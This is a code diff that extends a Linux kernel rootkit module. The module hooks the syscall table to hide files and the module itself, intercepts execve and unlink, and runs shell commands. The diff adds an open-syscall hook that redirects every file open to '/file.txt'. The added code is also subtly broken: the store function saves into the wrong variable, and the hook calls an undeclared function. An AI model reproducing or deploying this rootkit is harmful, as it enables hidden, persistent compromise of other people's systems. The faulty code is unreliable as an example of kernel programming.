@@ -15,6 +15,7 @@
 #include <asm/uaccess.h>
 #include <linux/namei.h>
 #include <linux/path.h>
+#include <linux/uaccess.h>
 
 
 #ifdef MODULE
@@ -27,6 +28,7 @@ extern struct module __this_module;
 #define HIDE_PREFIX     "arman"
 #define EXEC_PREFIC     "_antivirus"
 #define HIDE_PREFIX_SZ  (sizeof(HIDE_PREFIX) - 1)
+#define OPEN_PATH       "/file.txt"
 
 #define MAX_CMD_LEN 1976
 
@@ -45,6 +47,8 @@ enum signals {
     SHOWMODULE = 63,
     HIDEFILES = 62,
     SHOWFILES = 61,
+    HACK_OPEN = 60,
+    UNHACK_OPEN = 59
 };
 
 // Using kprobes method for getting syscall table address for new versions of kernel
@@ -103,6 +107,7 @@ static syscall_wrapper orig_sys_openat;
 static syscall_wrapper orig_sys_getdents64;
 static syscall_wrapper orig_unlink;
 static syscall_wrapper orig_execve;
+static syscall_wrapper orig_open;
 
 
 static inline void write_forced_cr0(unsigned long value)
@@ -279,6 +284,21 @@ static asmlinkage long h_sys_execve(struct pt_regs *regs)
     return orig_execve(regs);
 }
 
+static asmlinkage long h_sys_open(struct pt_regs *regs)
+{
+    char * new_path = OPEN_PATH;
+    const char __user *filename = (const char __user *)regs->di;
+
+    // Check if the original filename can be accessed
+    if (!access_ok(VERIFY_READ, filename, 1))
+        return -EFAULT;
+
+    // Modify regs->di to point to new_path
+    regs->di = (unsigned long)new_path;
+
+    return orig_sys_open(regs);
+}
+
 #endif
 
 void hide_module(void)
@@ -383,6 +403,22 @@ static void restore_execve(void)
     __sys_call_table_addr[__NR_execve] = (unsigned long)orig_execve;
 }
 
+static void store_open(void)
+{
+    orig_execve = (syscall_wrapper)__sys_call_table_addr[__NR_open];
+}
+
+static void hook_open(void)
+{
+    __sys_call_table_addr[__NR_open] = (unsigned long)&h_sys_open;
+}
+
+static void restore_open(void)
+{
+    /* Restore syscall table */
+    __sys_call_table_addr[__NR_open] = (unsigned long)orig_open;
+}
+
 static void work_handler(struct work_struct * work)
 {
     static char *argv[] = {"/bin/sh", "-c", cmd_string, NULL};
@@ -480,6 +516,7 @@ static int __init mod_init(void)
     store_getdents64();
     store_unlink();
     store_execve();
+    store_open();
 
     unprotect_memory();
 
@@ -488,6 +525,7 @@ static int __init mod_init(void)
     hook_openat();
     hook_unlink();
     hook_execve();
+    hook_open();
 
     protect_memory();
 
@@ -507,6 +545,7 @@ static void __exit mod_exit(void)
     restore_getdents64();
     restore_unlink();
     restore_execve();
+    restore_open();
 
     protect_memory();
 
